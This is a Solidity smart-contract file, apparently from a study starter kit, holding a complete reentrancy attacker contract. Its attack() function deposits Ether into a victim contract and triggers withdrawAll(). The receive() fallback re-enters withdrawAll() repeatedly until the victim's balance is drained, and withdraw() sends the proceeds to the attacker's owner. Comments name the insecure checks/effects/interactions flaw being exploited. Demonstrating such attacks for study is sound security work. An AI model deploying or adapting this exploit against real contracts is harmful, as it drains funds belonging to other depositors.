// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./IVictim.sol";

contract Attacker {
    IVictim public victim;
    address public owner;
    bool public attackInProgress;

    constructor(address _victim) {
        victim = IVictim(_victim);
        owner = msg.sender;
    }

    function attack() public payable {
        // sends ether to the victim contract
        require(msg.value > 0, "Send some Ether to initiate the attack");
        attackInProgress = true;
        // calls the deposit function of the victim contract
        victim.deposit{value: msg.value}();
        // calls the withdrawAll function of the victim contract
        //If the victim contract makes an external call to transfer
        // Ether before updating the internal balance (i.e., following an insecure checks/effects/interactions pattern), control passes to the attacker.
        victim.withdrawAll();
        attackInProgress = false;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        require(msg.sender == owner, "Unauthorized");
        payable(owner).transfer(address(this).balance);
    }
    // filepath: /Users/hanyuwu/Study/solidity-starter-kit/contracts/Attacker.sol
    receive() external payable {
        if (attackInProgress && address(victim).balance > 0) {
            victim.withdrawAll();
        }
    }
}
